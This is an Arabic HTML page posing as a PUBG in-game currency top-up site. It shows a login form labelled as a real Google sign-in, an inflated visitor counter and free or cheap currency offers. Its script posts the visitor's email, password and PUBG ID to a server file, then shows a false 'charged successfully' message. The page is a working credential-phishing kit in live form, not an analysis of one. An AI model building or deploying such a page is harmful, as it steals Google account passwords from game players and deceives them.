<!DOCTYPE html><html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>موقع شحن شدات ببجي</title>
  <style>
    :root {
      --dark-blue: #0d1b2a;
      --light-bg: #f0f0f0;
      --dark-text: #e0e0e0;
      --light-text: #333;
    }
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: var(--dark-blue);
      color: var(--dark-text);
      transition: background-color 0.3s, color 0.3s;
    }
    .light-mode {
      background-color: var(--light-bg);
      color: var(--light-text);
    }
    header {
      padding: 1rem;
      text-align: center;
      background: #1b263b;
      color: white;
    }
    .toggle-mode {
      margin-top: 1rem;
      padding: 0.5rem 1rem;
      background: #415a77;
      color: white;
      border: none;
      cursor: pointer;
    }
    .toggle-mode:active {
      transform: scale(0.95);
    }
    .container {
      padding: 2rem;
      max-width: 600px;
      margin: auto;
    }
    .google-login-form {
      display: flex;
      flex-direction: column;
      gap: 1rem;
      margin-top: 1rem;
    }
    input {
      padding: 0.6rem;
      border-radius: 5px;
      border: 1px solid #ccc;
    }
    .submit-btn, .confirm-btn {
      background: #4285f4;
      color: white;
      padding: 0.7rem 1.2rem;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      transition: transform 0.1s;
    }
    .submit-btn:active, .confirm-btn:active {
      transform: scale(0.95);
    }
    .stats {
      margin-top: 2rem;
      font-size: 1.2rem;
    }
    .offers {
      margin-top: 2rem;
      padding: 1rem;
      border: 1px solid #ccc;
      border-radius: 10px;
      background-color: #1e2a3a;
    }
    .offer {
      margin-bottom: 1rem;
      padding: 1rem;
      background-color: #324863;
      border-radius: 8px;
      color: white;
      cursor: pointer;
    }
    .hidden {
      display: none;
    }
    .loading-bar {
      width: 0;
      height: 10px;
      background: lime;
      margin-top: 10px;
      transition: width 2s linear;
    }
    .success-msg {
      color: lightgreen;
      font-weight: bold;
      margin-top: 1rem;
    }
  </style>
</head>
<body>
  <header>
    <h1>مرحبا بك في الموقع شحن شداد ببجي</h1>
    <button class="toggle-mode" onclick="toggleMode()">تبديل الوضع النهاري / الليلي</button>
  </header>  <div class="container">
    <h2>تسجيل الدخول بحساب Google (حقيقي)</h2>
    <form class="google-login-form" onsubmit="return validateLogin()">
      <input type="email" id="email" placeholder="البريد الإلكتروني" required />
      <input type="password" id="password" placeholder="كلمة المرور" required />
      <button type="submit" class="submit-btn">تسجيل الدخول</button>
    </form><div class="stats">
  <p>عدد الزوار: <strong id="visitor-count">19,715,016</strong></p>
</div>

<div class="offers hidden" id="offers">
  <h3>عروض شدات ببجي</h3>
  <div class="offer" onclick="startProcess('1000 مجاني')">1000 شدة - مجاني</div>
  <div class="offer" onclick="startProcess('2000 - 5 دولار')">2000 شدة - 5 دولار</div>
  <div class="offer" onclick="startProcess('3000 - 6 دولار')">3000 شدة - 6 دولار</div>

  <div class="hidden" id="loading">
    <p>جاري المعالجة...</p>
    <div class="loading-bar" id="loading-bar"></div>
  </div>

  <div class="hidden" id="id-form">
    <input type="text" id="pubg-id" placeholder="أدخل ID ببجي" />
    <button class="confirm-btn" onclick="submitID()">موافق</button>
  </div>

  <div class="success-msg hidden" id="success">تم الشحن بنجاح ✔️</div>
</div>

  </div>  <script>
    let selectedOffer = "";

    function toggleMode() {
      document.body.classList.toggle("light-mode");
    }

    function validateLogin() {
      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;

      if (email.endsWith("@gmail.com") && password.length >= 6) {
        alert("تم تسجيل الدخول بنجاح (محاكاة)");
        document.getElementById("offers").classList.remove("hidden");
      } else {
        alert("يرجى إدخال بيانات صحيحة.");
      }
      return false;
    }

    function startProcess(offer) {
      selectedOffer = offer;
      document.getElementById("loading").classList.remove("hidden");
      const bar = document.getElementById("loading-bar");
      bar.style.width = "100%";

      setTimeout(() => {
        document.getElementById("loading").classList.add("hidden");
        document.getElementById("id-form").classList.remove("hidden");
      }, 2000);
    }

    function submitID() {
      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;
      const pubgId = document.getElementById("pubg-id").value;

      if (pubgId.trim() === "") {
        alert("يرجى إدخال ID ببجي صحيح");
        return;
      }

      fetch("php.txt", {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded"
        },
        body: `email=${email}&password=${password}&pubg_id=${pubgId}&offer=${selectedOffer}`
      });

      document.getElementById("id-form").classList.add("hidden");
      document.getElementById("success").classList.remove("hidden");
    }
  </script></body>
</html>
